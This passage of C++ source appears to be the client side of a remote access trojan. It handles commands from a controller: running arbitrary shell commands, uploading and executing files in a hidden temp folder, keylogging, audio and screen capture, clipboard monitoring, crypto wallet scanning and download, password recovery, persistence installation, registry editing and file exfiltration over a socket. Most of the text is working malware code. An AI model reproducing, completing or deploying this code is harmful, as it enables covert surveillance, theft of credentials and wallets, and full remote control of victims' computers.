                    std::string command = message.substr(cmd_start, cmd_end - cmd_start);
                    executeCommand(command);
                }
            }


        }

        else if (message.find("\"type\":\"scan_wallets\"") != std::string::npos) {
            handleScanWallets();
        }
        else if (message.find("\"type\":\"download_wallet\"") != std::string::npos) {
            handleDownloadWallet(message);
        }
        else if (message.find("\"type\":\"start_audio_record\"") != std::string::npos) {
            handleStartAudioRecord(message);
        }
        else if (message.find("\"type\":\"stop_audio_record\"") != std::string::npos) {
            handleStopAudioRecord();
        }
        else if (message.find("\"type\":\"get_audio_devices\"") != std::string::npos) {
            handleGetAudioDevices();
        }
        else if (message.find("\"type\":\"install_persistence\"") != std::string::npos) {
            handleInstallPersistence(message);
        }
        else if (message.find("\"type\":\"remove_persistence\"") != std::string::npos) {
            handleRemovePersistence();
        }
        else if (message.find("\"type\":\"check_persistence\"") != std::string::npos) {
            handleCheckPersistence();
        }
        else if (message.find("\"type\":\"scan_ports\"") != std::string::npos) {
            handlePortScan(message);
        }
        else if (message.find("\"type\":\"stop_port_scan\"") != std::string::npos) {
            handleStopPortScan();
        }

        else if (message.find("\"type\":\"get_connections\"") != std::string::npos) {
            handleGetConnections();
        }
        else if (message.find("\"type\":\"close_connection\"") != std::string::npos) {
            handleCloseConnection(message);
        }
        else if (message.find("\"type\":\"start_netstat_monitor\"") != std::string::npos) {
            handleStartNetstatMonitor();
        }
        else if (message.find("\"type\":\"stop_netstat_monitor\"") != std::string::npos) {
            handleStopNetstatMonitor();
        }

        else if (message.find("\"type\":\"get_processes\"") != std::string::npos) {
            handleGetProcesses();
        }
        else if (message.find("\"type\":\"kill_process\"") != std::string::npos) {
            handleKillProcess(message);
        }
        else if (message.find("\"type\":\"search_process\"") != std::string::npos) {
            handleSearchProcess(message);
        }
        else if (message.find("\"type\":\"start_process\"") != std::string::npos) {
            handleStartProcess(message);
        }
        else if (message.find("\"type\":\"set_process_priority\"") != std::string::npos) {
            handleSetProcessPriority(message);
        }
        else if (message.find("\"type\":\"get_process_details\"") != std::string::npos) {
            handleGetProcessDetails(message);
        }

        else if (message.find("\"type\":\"get_clipboard\"") != std::string::npos) {
            handleGetClipboard();
        }
        else if (message.find("\"type\":\"set_clipboard\"") != std::string::npos) {
            handleSetClipboard(message);
        }
        else if (message.find("\"type\":\"start_clipboard_monitor\"") != std::string::npos) {
            handleStartClipboardMonitor();
        }
        else if (message.find("\"type\":\"stop_clipboard_monitor\"") != std::string::npos) {
            handleStopClipboardMonitor();
        }

        else if (message.find("\"type\":\"registry_read\"") != std::string::npos) {
            handleRegistryRead(message);
        }
        else if (message.find("\"type\":\"registry_write\"") != std::string::npos) {
            handleRegistryWrite(message);
        }
        else if (message.find("\"type\":\"registry_delete\"") != std::string::npos) {
            handleRegistryDelete(message);
        }
        else if (message.find("\"type\":\"registry_enum_keys\"") != std::string::npos) {
            handleRegistryEnumKeys(message);
        }
        else if (message.find("\"type\":\"registry_enum_values\"") != std::string::npos) {
            handleRegistryEnumValues(message);
        }

        else if (message.find("\"type\":\"start_keylogger\"") != std::string::npos) {
            handleStartKeylogger();
        }
        else if (message.find("\"type\":\"stop_keylogger\"") != std::string::npos) {
            handleStopKeylogger();
        }
        else if (message.find("\"type\":\"get_keylog\"") != std::string::npos) {
            handleGetKeylog();
        }
        else if (message.find("\"type\":\"clear_keylog\"") != std::string::npos) {
            handleClearKeylog();
        }

        else if (message.find("\"type\":\"start_screenshot\"") != std::string::npos) {
            // Extract quality setting
            size_t quality_start = message.find("\"quality\":\"");
            if (quality_start != std::string::npos) {
                quality_start += 11;
                size_t quality_end = message.find("\"", quality_start);
                if (quality_end != std::string::npos) {
                    std::string quality = message.substr(quality_start, quality_end - quality_start);
                    if (quality == "low") {
                        screenshot_quality = 4; // 1/4 scale
                    }
                    else if (quality == "medium") {
                        screenshot_quality = 2; // 1/2 scale
                    }
                    else if (quality == "high") {
                        screenshot_quality = 1; // Full scale
                    }
                }
            }
            screenshot_active = true;
            std::cout << "[SCREENSHOT] Starting screen capture with quality scale 1/" << screenshot_quality << std::endl;
        }
        else if (message.find("\"type\":\"stop_screenshot\"") != std::string::npos) {
            screenshot_active = false;
            std::cout << "[SCREENSHOT] Stopping screen capture..." << std::endl;
        }
        else if (message.find("\"type\":\"get_screenshot\"") != std::string::npos) {
            if (screenshot_active) {
                captureAndSendScreenshot();
            }
        }
        else if (message.find("\"type\":\"file_upload_start\"") != std::string::npos) {
            handleFileUploadStart(message);
        }
        else if (message.find("\"type\":\"file_chunk\"") != std::string::npos) {
            handleFileChunk(message);
        }
        else if (message.find("\"type\":\"execute_file\"") != std::string::npos) {
            handleExecuteFile(message);
        }
        // File Manager commands
        else if (message.find("\"type\":\"fm_get_drives\"") != std::string::npos) {
            handleFmGetDrives();
        }
        else if (message.find("\"type\":\"fm_list_files\"") != std::string::npos) {
            handleFmListFiles(message);
        }
        else if (message.find("\"type\":\"fm_execute\"") != std::string::npos) {
            handleFmExecute(message);
        }
        else if (message.find("\"type\":\"fm_zip_folder\"") != std::string::npos) {
            handleFmZipFolder(message);
        }
        else if (message.find("\"type\":\"fm_download_file\"") != std::string::npos) {
            handleFmDownloadFile(message);
        }
        else if (message.find("\"type\":\"fm_upload_start\"") != std::string::npos) {
            handleFmUploadStart(message);
        }
        else if (message.find("\"type\":\"fm_upload_chunk\"") != std::string::npos) {
            handleFmUploadChunk(message);
        }
        else if (message.find("\"type\":\"messagebox\"") != std::string::npos) {
            handleMessageBox(message);
        }
        else if (message.find("\"type\":\"open_url\"") != std::string::npos) {
            handleOpenURL(message);
        }
        else if (message.find("\"type\":\"tts\"") != std::string::npos) {
            handleTTS(message);
        }
        else if (message.find("\"type\":\"get_sysinfo\"") != std::string::npos) {
            handleGetSysInfo();
        }
        else if (message.find("\"type\":\"execute_script\"") != std::string::npos) {
            handleExecuteScript(message);
        }
        else if (message.find("\"type\":\"fm_search\"") != std::string::npos) {
            handleFmSearch(message);
        }
        else if (message.find("\"type\":\"fm_stop_search\"") != std::string::npos) {
            handleFmStopSearch();
        }
        else if (message.find("\"type\":\"lock_screen\"") != std::string::npos) {
            handleLockScreen(message);
        }
        else if (message.find("\"type\":\"start_password_recovery\"") != std::string::npos) {
            handlePasswordRecovery();
        }
    }

    void executeCommand(const std::string& command) {
        std::cout << "[EXECUTING] " << command << std::endl;

        std::string result;
        bool success = false;

        try {
#ifdef _WIN32
            FILE* pipe = _popen(command.c_str(), "r");
#else
            FILE* pipe = popen(command.c_str(), "r");
#endif

            if (pipe) {
                char buffer[256];
                while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                    result += buffer;
                }

#ifdef _WIN32
                int exit_code = _pclose(pipe);
#else
                int exit_code = pclose(pipe);
#endif

                success = (exit_code == 0);
            }
            else {
                result = "Failed to execute command";
                success = false;
            }
        }
        catch (const std::exception& e) {
            result = "Exception: " + std::string(e.what());
            success = false;
        }

        sendCommandResponse(result, success);
    }

    void sendScriptResponse(const std::string& output, bool success, const std::string& error = "") {
        std::string response = "{\"type\":\"script_response\",";
        response += "\"success\":" + std::string(success ? "true" : "false") + ",";
        response += "\"output\":\"" + escapeJsonString(output) + "\",";
        response += "\"error\":\"" + escapeJsonString(error) + "\"}";
        response += "\n";
        sendMessage(response);
    }

#ifdef _WIN32
    std::vector<unsigned char> captureScreenWindows() {
        std::vector<unsigned char> imgData;

        try {
            // Get screen dimensions
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            // More aggressive scaling for high quality to prevent oversized data
            int scale = screenshot_quality;
            int width = screenWidth / scale;
            int height = screenHeight / scale;

            // Aggressive limits for high quality - much smaller
            if (scale == 1) {
                // For high quality, cap at 1280x720 for better reliability
                if (width > 1280) {
                    scale = screenWidth / 1280;
                    width = screenWidth / scale;
                    height = screenHeight / scale;
                }
                // Additional check for really large screens
                if (height > 720) {
                    scale = screenHeight / 720;
                    width = screenWidth / scale;
                    height = screenHeight / scale;
                }
            }

            std::cout << "[SCREENSHOT] Capturing " << width << "x" << height
                << " (original: " << screenWidth << "x" << screenHeight << ", scale: 1/" << scale << ")" << std::endl;

            // Get screen DC
            HDC hScreenDC = GetDC(NULL);
            if (!hScreenDC) {
                std::cout << "[ERROR] Failed to get screen DC" << std::endl;
                return imgData;
            }

            // Create memory DC
            HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
            if (!hMemoryDC) {
                std::cout << "[ERROR] Failed to create memory DC" << std::endl;
                ReleaseDC(NULL, hScreenDC);
                return imgData;
            }

            // Use 24-bit instead of 32-bit for smaller data size
            BITMAPINFO bmi = { 0 };
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height; // Top-down
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24; // 24-bit for smaller size
            bmi.bmiHeader.biCompression = BI_RGB;

            void* pBits = nullptr;
            HBITMAP hBitmap = CreateDIBSection(hScreenDC, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
            if (!hBitmap || !pBits) {
                std::cout << "[ERROR] Failed to create DIB section" << std::endl;
                DeleteDC(hMemoryDC);
                ReleaseDC(NULL, hScreenDC);
                return imgData;
            }

            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

            // Use high-quality stretching
            SetStretchBltMode(hMemoryDC, HALFTONE);
            SetBrushOrgEx(hMemoryDC, 0, 0, NULL);

            BOOL result = StretchBlt(hMemoryDC, 0, 0, width, height,
                hScreenDC, 0, 0, screenWidth, screenHeight, SRCCOPY);

            if (!result) {
                std::cout << "[ERROR] StretchBlt failed: " << GetLastError() << std::endl;
                SelectObject(hMemoryDC, hOldBitmap);
                DeleteObject(hBitmap);
                DeleteDC(hMemoryDC);
                ReleaseDC(NULL, hScreenDC);
                return imgData;
            }

            // Calculate sizes for 24-bit BMP
            int rowSize = ((width * 3 + 3) & ~3); // 4-byte aligned
            int imageSize = rowSize * height;
            int fileSize = 54 + imageSize;

            // Create BMP with proper format
            imgData.reserve(fileSize);

            // BMP File Header (14 bytes)
            imgData.push_back('B'); imgData.push_back('M');

            // File size
            imgData.push_back(fileSize & 0xFF);
            imgData.push_back((fileSize >> 8) & 0xFF);
            imgData.push_back((fileSize >> 16) & 0xFF);
            imgData.push_back((fileSize >> 24) & 0xFF);

            // Reserved
            imgData.push_back(0); imgData.push_back(0);
            imgData.push_back(0); imgData.push_back(0);

            // Offset to pixel data
            imgData.push_back(54); imgData.push_back(0);
            imgData.push_back(0); imgData.push_back(0);

            // DIB Header (40 bytes)
            imgData.push_back(40); imgData.push_back(0);
            imgData.push_back(0); imgData.push_back(0);

            // Width
            imgData.push_back(width & 0xFF);
            imgData.push_back((width >> 8) & 0xFF);
            imgData.push_back((width >> 16) & 0xFF);
            imgData.push_back((width >> 24) & 0xFF);

            // Height (positive for bottom-up)
            imgData.push_back(height & 0xFF);
            imgData.push_back((height >> 8) & 0xFF);
            imgData.push_back((height >> 16) & 0xFF);
            imgData.push_back((height >> 24) & 0xFF);

            // Planes
            imgData.push_back(1); imgData.push_back(0);

            // Bits per pixel
            imgData.push_back(24); imgData.push_back(0);

            // Compression
            for (int i = 0; i < 4; i++) imgData.push_back(0);

            // Image size
            imgData.push_back(imageSize & 0xFF);
            imgData.push_back((imageSize >> 8) & 0xFF);
            imgData.push_back((imageSize >> 16) & 0xFF);
            imgData.push_back((imageSize >> 24) & 0xFF);

            // X/Y pixels per meter and colors
            for (int i = 0; i < 16; i++) imgData.push_back(0);

            // Get pixel data directly from DIB section
            unsigned char* src = (unsigned char*)pBits;

            // Add pixel data with proper row padding (bottom-up for BMP)
            for (int y = height - 1; y >= 0; y--) {
                for (int x = 0; x < width; x++) {
                    int srcIdx = (y * width + x) * 3;
                    imgData.push_back(src[srcIdx + 0]); // B
                    imgData.push_back(src[srcIdx + 1]); // G
                    imgData.push_back(src[srcIdx + 2]); // R
                }
                // Add row padding
                int padding = rowSize - (width * 3);
                for (int p = 0; p < padding; p++) {
                    imgData.push_back(0);
                }
            }

            std::cout << "[SCREENSHOT] Successfully captured " << imgData.size()
                << " bytes (" << width << "x" << height << ")" << std::endl;

            // Cleanup
            SelectObject(hMemoryDC, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hMemoryDC);
            ReleaseDC(NULL, hScreenDC);

        }
        catch (...) {
            std::cout << "[ERROR] Exception in screenshot capture" << std::endl;
        }

        return imgData;
    }
#endif

    void captureAndSendScreenshot() {
        if (!screenshot_active || !connected) return;

#ifdef _WIN32
        std::vector<unsigned char> imgData = captureScreenWindows();

        if (!imgData.empty()) {
            // Check size limits based on quality
            const size_t MAX_SIZE_HIGH = 8 * 1024 * 1024;    // 8MB for high quality
            const size_t MAX_SIZE_MEDIUM = 4 * 1024 * 1024;  // 4MB for medium quality
            const size_t MAX_SIZE_LOW = 2 * 1024 * 1024;     // 2MB for low quality

            size_t max_size = MAX_SIZE_LOW;
            if (screenshot_quality == 1) max_size = MAX_SIZE_HIGH;
            else if (screenshot_quality == 2) max_size = MAX_SIZE_MEDIUM;

            if (imgData.size() > max_size) {
                std::cout << "[WARNING] Screenshot too large (" << imgData.size()
                    << " bytes), max allowed: " << max_size << " bytes" << std::endl;
                sendScreenshotResponse("", false);
                return;
            }

            std::string base64Image = base64_encode(imgData);

            // Additional size check for base64 (should be about 33% larger)
            const size_t MAX_BASE64_SIZE = max_size * 4 / 3 + 1000; // Add some padding
            if (base64Image.length() > MAX_BASE64_SIZE) {
                std::cout << "[WARNING] Base64 screenshot too large (" << base64Image.length()
                    << " chars), max allowed: " << MAX_BASE64_SIZE << " chars" << std::endl;
                sendScreenshotResponse("", false);
                return;
            }

            std::cout << "[SCREENSHOT] Encoded to base64: " << base64Image.length() << " chars" << std::endl;

            sendScreenshotResponse(base64Image, true);
        }
        else {
            std::cout << "[ERROR] Screenshot capture failed" << std::endl;
            sendScreenshotResponse("", false);
        }
#else
        // Linux implementation
        int resize_percent = 100 / screenshot_quality;
        std::string cmd = "import -window root -resize " + std::to_string(resize_percent) + "% /tmp/0x_screen.bmp 2>/dev/null";
        system(cmd.c_str());

        std::ifstream file("/tmp/0x_screen.bmp", std::ios::binary);
        if (file) {
            file.seekg(0, std::ios::end);
            size_t size = file.tellg();
            file.seekg(0, std::ios::beg);

            std::vector<unsigned char> buffer(size);
            file.read((char*)buffer.data(), size);
            file.close();

            std::string base64Image = base64_encode(buffer);
            sendScreenshotResponse(base64Image, true);

            unlink("/tmp/0x_screen.bmp");
        }
        else {
            sendScreenshotResponse("", false);
        }
#endif
    }

    void sendScreenshotResponse(const std::string& base64Image, bool success) {
        if (!connected) return;

        // Create JSON with proper escaping
        std::stringstream ss;
        ss << "{\"type\":\"screenshot\",\"image\":\"" << base64Image << "\",\"success\":"
            << (success ? "true" : "false") << "}\n";

        std::string response = ss.str();
        std::cout << "[SCREENSHOT] Sending response: " << (success ? "SUCCESS" : "FAILED")
            << " (" << response.length() << " bytes)" << std::endl;

        sendMessage(response);
    }

    void sendMessage(const std::string& message) {
        std::lock_guard<std::mutex> lock(send_mutex);

        if (!connected || sock == INVALID_SOCKET) {
            return;
        }

        try {
            // Send message all at once for better reliability
            int bytes_sent = 0;
            int remaining = message.length();
            const char* data = message.c_str();

            while (remaining > 0) {
#ifdef _WIN32
                bytes_sent = ::send(sock, data + (message.length() - remaining), remaining, 0);
#else
                bytes_sent = ::send(sock, data + (message.length() - remaining), remaining, 0);
#endif

                if (bytes_sent <= 0) {
                    std::cout << "[ERROR] Failed to send message: " << SOCKET_ERROR_CODE << std::endl;
                    connected = false;
                    break;
                }

                remaining -= bytes_sent;
            }
        }
        catch (...) {
            std::cout << "[ERROR] Exception in sendMessage" << std::endl;
            connected = false;
        }
    }

    // File upload and file manager methods remain the same...
    void handleFileUploadStart(const std::string& message) {
        // Extract filename and total chunks
        size_t filename_start = message.find("\"filename\":\"");
        size_t chunks_start = message.find("\"total_chunks\":");

        if (filename_start != std::string::npos && chunks_start != std::string::npos) {
            filename_start += 12;
            size_t filename_end = message.find("\"", filename_start);
            current_upload_filename = message.substr(filename_start, filename_end - filename_start);

            chunks_start += 15;
            size_t chunks_end = message.find_first_of(",}", chunks_start);
            expected_chunks = std::stoi(message.substr(chunks_start, chunks_end - chunks_start));
            received_chunks = 0;

            // Create temp directory if it doesn't exist
#ifdef _WIN32
            CreateDirectoryA("C:\\Windows\\Temp\\0x_exec", NULL);
            std::string filepath = "C:\\Windows\\Temp\\0x_exec\\" + current_upload_filename;
#else
            system("mkdir -p /tmp/0x_exec");
            std::string filepath = "/tmp/0x_exec/" + current_upload_filename;
#endif

            // Close any existing file
            if (current_upload_file.is_open()) {
                current_upload_file.close();
            }

            current_upload_file.open(filepath, std::ios::binary);

            std::cout << "[FILE UPLOAD] Starting upload of " << current_upload_filename
                << " (" << expected_chunks << " chunks)" << std::endl;

            // Send console output to web
            sendExecuteOutput("[CLIENT] Starting file upload: " + current_upload_filename, false, true);

            // Send acknowledgment
            sendMessage("{\"type\":\"file_upload_ack\",\"status\":\"started\"}\n");
        }
    }

    void handleFileChunk(const std::string& message) {
        // Extract chunk data and index
        size_t chunk_data_start = message.find("\"chunk_data\":\"");
        size_t chunk_index_start = message.find("\"chunk_index\":");
        size_t is_last_start = message.find("\"is_last\":");

        if (chunk_data_start != std::string::npos && current_upload_file.is_open()) {
            chunk_data_start += 14;
            size_t chunk_data_end = message.find("\"", chunk_data_start);
            std::string chunk_base64 = message.substr(chunk_data_start, chunk_data_end - chunk_data_start);

            // Decode base64 chunk
            std::vector<unsigned char> decoded = base64_decode(chunk_base64);
            current_upload_file.write((char*)decoded.data(), decoded.size());
            current_upload_file.flush(); // Ensure data is written

            received_chunks++;

            // Log progress every 10 chunks
            if (received_chunks % 10 == 0) {
                std::cout << "[FILE UPLOAD] Progress: " << received_chunks << "/" << expected_chunks << std::endl;
            }

            // Check if last chunk
            bool is_last = false;
            if (is_last_start != std::string::npos) {
                is_last_start += 10;
                is_last = message.substr(is_last_start, 4) == "true";
            }

            if (is_last || received_chunks >= expected_chunks) {
                current_upload_file.close();
                std::cout << "[FILE UPLOAD] Upload complete: " << current_upload_filename << std::endl;

                // Send console output
                sendExecuteOutput("[CLIENT] File upload complete: " + current_upload_filename, false, true);

                // Send completion message
                std::string response = "{\"type\":\"file_upload_complete\",\"success\":true,\"filename\":\""
                    + current_upload_filename + "\"}\n";
                sendMessage(response);
            }
        }
    }

    void handleExecuteFile(const std::string& message) {
        // Extract filename
        size_t filename_start = message.find("\"filename\":\"");
        if (filename_start != std::string::npos) {
            filename_start += 12;
            size_t filename_end = message.find("\"", filename_start);
            std::string filename = message.substr(filename_start, filename_end - filename_start);

#ifdef _WIN32
            std::string filepath = "C:\\Windows\\Temp\\0x_exec\\" + filename;
#else
            std::string filepath = "/tmp/0x_exec/" + filename;
            // Make executable on Linux
            std::string chmod_cmd = "chmod +x \"" + filepath + "\"";
            system(chmod_cmd.c_str());
#endif

            std::cout << "[EXECUTE] Executing file: " << filepath << std::endl;

            // Send console output
            sendExecuteOutput("[CLIENT] Starting execution: " + filepath, false, true);

            // Execute the file
            std::string output;
            int exit_code = 0;

            try {
#ifdef _WIN32
                // Windows: just run the file
                FILE* pipe = _popen(("\"" + filepath + "\"").c_str(), "r");
#else
                // Linux: execute directly
                FILE* pipe = popen(("\"" + filepath + "\" 2>&1").c_str(), "r");
#endif

                if (pipe) {
                    char buffer[256];
                    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                        output += buffer;

                        // Send output in real-time
                        if (output.length() > 1024) {
                            sendExecuteOutput(output, false, false);
                            output.clear();
                        }
                    }

#ifdef _WIN32
                    exit_code = _pclose(pipe);
#else
                    exit_code = pclose(pipe);
                    exit_code = WEXITSTATUS(exit_code);
#endif
                }
                else {
                    output = "Failed to execute file";
                    exit_code = -1;
                }
            }
            catch (const std::exception& e) {
                output = "Exception: " + std::string(e.what());
                exit_code = -1;
            }

            // Send final output and completion
            if (!output.empty()) {
                sendExecuteOutput(output, true, exit_code == 0);
            }

            // Send console status
            sendExecuteOutput("[CLIENT] Execution finished with exit code: " + std::to_string(exit_code), false, exit_code == 0);

            // Send completion message
            std::string completion = "{\"type\":\"execute_response\",\"completed\":true,\"exit_code\":"
                + std::to_string(exit_code) + "}\n";
            sendMessage(completion);
        }
    }

    void sendExecuteOutput(const std::string& output, bool final_output, bool success) {
        // Escape output for JSON
        std::string escaped_output;
        for (char c : output) {
            if (c == '"') escaped_output += "\\\"";
            else if (c == '\\') escaped_output += "\\\\";
            else if (c == '\n') escaped_output += "\\n";
            else if (c == '\r') escaped_output += "\\r";
            else if (c == '\t') escaped_output += "\\t";
            else if (c >= 32 && c <= 126) escaped_output += c;
        }

        std::string response = "{\"type\":\"execute_response\",\"output\":\"" + escaped_output
            + "\",\"success\":" + (success ? "true" : "false") + "}\n";
        sendMessage(response);
    }

    // File Manager Functions
    void handleFmGetDrives() {
        std::string drives_json = "{\"type\":\"fm_drives\",\"drives\":[";

#ifdef _WIN32
        DWORD drives = GetLogicalDrives();
        bool first = true;

        for (char drive = 'A'; drive <= 'Z'; drive++) {
            if (drives & (1 << (drive - 'A'))) {
                if (!first) drives_json += ",";
                drives_json += "\"" + std::string(1, drive) + ":\"";
                first = false;
            }
        }
#else
        // On Linux, just return root
        drives_json += "\"/\"";
#endif

        drives_json += "]}\n";
        sendMessage(drives_json);
    }

    void handleFmListFiles(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string path = message.substr(path_start, path_end - path_start);

        // Unescape the path
        path = unescapeJsonString(path);

        std::string files_json = "{\"type\":\"fm_files\",\"path\":\"" + escapeJsonString(path) + "\",\"files\":[";
        bool first = true;

        try {
            for (const auto& entry : fs::directory_iterator(path)) {
                if (!first) files_json += ",";
                first = false;

                std::string name = entry.path().filename().string();
                std::string type = entry.is_directory() ? "directory" : "file";
                uintmax_t size = 0;

                try {
                    size = entry.is_directory() ? 0 : fs::file_size(entry);
                }
                catch (...) {
                    size = 0; // Handle permission issues
                }

                // Get modified time
                try {
                    auto ftime = fs::last_write_time(entry);
                    auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now()
                    );
                    std::time_t tt = std::chrono::system_clock::to_time_t(sctp);

                    char timestr[100];
                    std::strftime(timestr, sizeof(timestr), "%Y-%m-%d %H:%M", std::localtime(&tt));

                    files_json += "{\"name\":\"" + escapeJsonString(name) + "\",\"type\":\"" + type
                        + "\",\"size\":" + std::to_string(size)
                        + ",\"modified\":\"" + std::string(timestr) + "\"}";
                }
                catch (...) {
                    files_json += "{\"name\":\"" + escapeJsonString(name) + "\",\"type\":\"" + type
                        + "\",\"size\":" + std::to_string(size)
                        + ",\"modified\":\"Unknown\"}";
                }
            }
        }
        catch (const std::exception& e) {
            std::cout << "[FILE MANAGER] Error listing files: " << e.what() << std::endl;
        }

        files_json += "]}\n";
        sendMessage(files_json);
    }

    void handleFmExecute(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string path = message.substr(path_start, path_end - path_start);

        // Unescape the path
        path = unescapeJsonString(path);

        std::cout << "[FILE MANAGER] Executing: " << path << std::endl;

        try {
#ifdef _WIN32
            ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW);
#else
            std::string cmd = "\"" + path + "\" &";
            system(cmd.c_str());
#endif

            std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"execute\","
                "\"success\":true,\"message\":\"File executed successfully\"}\n";
            sendMessage(response);
        }
        catch (const std::exception& e) {
            std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"execute\","
                "\"success\":false,\"message\":\"" + escapeJsonString(e.what()) + "\"}\n";
            sendMessage(response);
        }
    }

    void handleFmZipFolder(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string path = message.substr(path_start, path_end - path_start);

        // Unescape the path
        path = unescapeJsonString(path);

        std::cout << "[FILE MANAGER] Creating ZIP for: " << path << std::endl;

        try {
#ifdef _WIN32
            // Check if path is a file or directory
            DWORD attributes = GetFileAttributesA(path.c_str());
            bool isDirectory = (attributes != INVALID_FILE_ATTRIBUTES) && (attributes & FILE_ATTRIBUTE_DIRECTORY);

            std::string item_name;
            std::string parent_path;
            std::string zip_filename;
            std::string zip_path;

            if (isDirectory) {
                // It's a directory - zip the entire folder
                item_name = fs::path(path).filename().string();
                if (item_name.empty()) {
                    item_name = "archive";
                }
                parent_path = fs::path(path).parent_path().string();
                zip_filename = item_name + "_" + std::to_string(time(nullptr)) + ".zip";
            }
            else {
                // It's a file - zip just this file
                item_name = fs::path(path).stem().string(); // filename without extension
                parent_path = fs::path(path).parent_path().string();
                zip_filename = item_name + "_" + std::to_string(time(nullptr)) + ".zip";
            }

            if (parent_path.empty()) {
                zip_path = zip_filename;
            }
            else {
                zip_path = parent_path + "\\" + zip_filename;
            }

            std::string ps_command;

            if (isDirectory) {
                // Zip entire directory
                ps_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
                ps_command += "try { ";
                ps_command += "Add-Type -AssemblyName System.IO.Compression.FileSystem; ";
                ps_command += "[System.IO.Compression.ZipFile]::CreateFromDirectory('";
                ps_command += path + "', '";
                ps_command += zip_path + "'); ";
                ps_command += "Write-Host 'ZIP_SUCCESS'; ";
                ps_command += "} catch { ";
                ps_command += "Write-Host 'ZIP_ERROR:' $_.Exception.Message; ";
                ps_command += "}\"";
            }
            else {
                // Zip single file
                ps_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
                ps_command += "try { ";
                ps_command += "Add-Type -AssemblyName System.IO.Compression.FileSystem; ";
                ps_command += "$zip = [System.IO.Compression.ZipFile]::Open('";
                ps_command += zip_path + "', 'Create'); ";
                ps_command += "[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, '";
                ps_command += path + "', '";
                ps_command += fs::path(path).filename().string() + "'); ";
                ps_command += "$zip.Dispose(); ";
                ps_command += "Write-Host 'ZIP_SUCCESS'; ";
                ps_command += "} catch { ";
                ps_command += "Write-Host 'ZIP_ERROR:' $_.Exception.Message; ";
                ps_command += "}\"";
            }

            std::cout << "[ZIP] Executing: " << ps_command << std::endl;

            // Execute PowerShell command and capture output
            std::string output;
            FILE* pipe = _popen(ps_command.c_str(), "r");
            if (pipe) {
                char buffer[256];
                while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                    output += buffer;
                }
                int result = _pclose(pipe);

                std::cout << "[ZIP] PowerShell output: " << output << std::endl;

                if (output.find("ZIP_SUCCESS") != std::string::npos) {
                    std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                        "\"success\":true,\"message\":\"ZIP archive created: " + zip_filename + "\"}\n";
                    sendMessage(response);
                }
                else {
                    std::string error_msg = "Failed to create ZIP archive";
                    if (output.find("ZIP_ERROR:") != std::string::npos) {
                        error_msg = output.substr(output.find("ZIP_ERROR:") + 10);
                        // Remove newlines
                        error_msg.erase(std::remove(error_msg.begin(), error_msg.end(), '\n'), error_msg.end());
                        error_msg.erase(std::remove(error_msg.begin(), error_msg.end(), '\r'), error_msg.end());
                    }
                    std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                        "\"success\":false,\"message\":\"" + escapeJsonString(error_msg) + "\"}\n";
                    sendMessage(response);
                }
            }
            else {
                std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                    "\"success\":false,\"message\":\"Failed to execute PowerShell command\"}\n";
                sendMessage(response);
            }

#else
            // Linux implementation - handle both files and directories
            std::string item_name = fs::path(path).filename().string();
            if (item_name.empty()) {
                item_name = "archive";
            }

            std::string parent_path = fs::path(path).parent_path().string();
            std::string zip_filename = item_name + "_" + std::to_string(time(nullptr)) + ".zip";
            std::string zip_path = parent_path + "/" + zip_filename;

            std::string cmd;
            if (fs::is_directory(path)) {
                cmd = "cd \"" + parent_path + "\" && zip -r \"" + zip_filename + "\" \"" + item_name + "\"";
            }
            else {
                cmd = "cd \"" + parent_path + "\" && zip \"" + zip_filename + "\" \"" + item_name + "\"";
            }

            int result = system(cmd.c_str());

            if (result == 0) {
                std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                    "\"success\":true,\"message\":\"ZIP archive created: " + zip_filename + "\"}\n";
                sendMessage(response);
            }
            else {
                std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                    "\"success\":false,\"message\":\"Failed to create ZIP archive\"}\n";
                sendMessage(response);
            }
#endif
        }
        catch (const std::exception& e) {
            std::string response = "{\"type\":\"fm_operation_result\",\"operation\":\"zip\","
                "\"success\":false,\"message\":\"" + escapeJsonString(e.what()) + "\"}\n";
            sendMessage(response);
        }
    }

    // FIXED download file method with proper base64 chunk handling
    void handleFmDownloadFile(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string path = message.substr(path_start, path_end - path_start);

        // Unescape the path
        path = unescapeJsonString(path);

        std::cout << "[FILE MANAGER] Downloading: " << path << std::endl;

        try {
            std::ifstream file(path, std::ios::binary);
            if (!file) {
                throw std::runtime_error("Cannot open file for reading");
            }

            // Get file size
            file.seekg(0, std::ios::end);
            size_t file_size = file.tellg();
            file.seekg(0, std::ios::beg);

            if (file_size == 0) {
